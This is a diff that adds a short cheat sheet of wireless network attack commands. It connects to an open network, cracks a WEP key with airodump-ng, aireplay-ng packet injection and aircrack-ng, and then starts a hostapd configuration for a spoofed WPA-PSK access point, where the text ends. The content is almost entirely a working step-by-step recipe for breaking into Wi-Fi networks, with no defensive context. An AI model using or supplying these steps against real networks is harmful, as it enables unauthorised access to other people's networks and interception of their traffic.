@@ -1,0 +1,37 @@
+CONNECTING TO OPEN WEP
+
+#change interface state
+ifconfig wlanX up
+
+#connect to network
+iwconfig wlanX essid NetworktoConnect
+
+#check status
+iw dev
+
+#assign IP
+dhclient -v wlanX
+
+CRACKING WEP
+
+#Run airodump-ng and output to a file
+airodump-ng --channel X wlanX -w filename
+
+#generate packets for WEP cracking
+aireplay-ng -3 -b {BSSID OF AP} -h {CONNECTED CLIENT MAC} wlanX
+
+#stop both airodump and aireplay
+#Crack the key!
+aircrack-ng filename.cap
+#choose index of WEP network to crack
+
+
+#BREAKING IN TO WPA-PSK network
+#create hostapd.conf file
+interface=wlanX
+ssid=[name of network to spoof]
+wpa=1
+wpa_passphrase=dummypassword
+wpa_key_mgmt=WPA-PSK
+rsn_pairwise=TKIP CCMP
+channel=[channel # of client]
